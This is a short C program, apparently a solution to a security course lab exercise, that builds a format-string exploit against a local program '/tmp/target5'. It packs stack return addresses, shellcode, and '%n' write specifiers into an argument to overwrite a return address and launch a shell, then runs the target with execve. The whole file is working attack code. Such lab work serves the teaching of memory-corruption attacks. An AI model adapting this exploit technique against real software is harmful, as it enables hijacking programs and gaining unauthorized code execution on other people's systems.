#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <unistd.h>
#include "shellcode.h"

#define TARGET "/tmp/target5"

int main(void)
{
  char *args[3];
  char *env[1];

  // retAddr should be the address of $ebp + 4
  char *retAddr = "\1\1\1\1\xf4\xfd\xff\xbf\1\1\1\1\xf5\xfd\xff\xbf\1\1\1\1\xf6\xfd\xff\xbf\1\1\1\1\xf7\xfd\xff\xbf";
  char *override = "%51d%n%124d%n%259d%n%192d%n";
  int len = strlen(retAddr) + strlen(override) + sizeof(shellcode);
  char exploit[len];
  memcpy(exploit, retAddr, strlen(retAddr));
  memcpy(exploit + strlen(retAddr), shellcode, sizeof(shellcode) - 1);
  memcpy(exploit + strlen(retAddr) + sizeof(shellcode) - 1, override, strlen(override));
  //memcpy(exploit + strlen(retAddr) + strlen(override), shellcode, sizeof(shellcode) - 1);
  exploit[len - 1] = '\0';

  args[0] = TARGET; args[1] = exploit; args[2] = NULL;
  env[0] = NULL;

  if (0 > execve(TARGET, args, env))
    fprintf(stderr, "execve failed.\n");

  return 0;
}
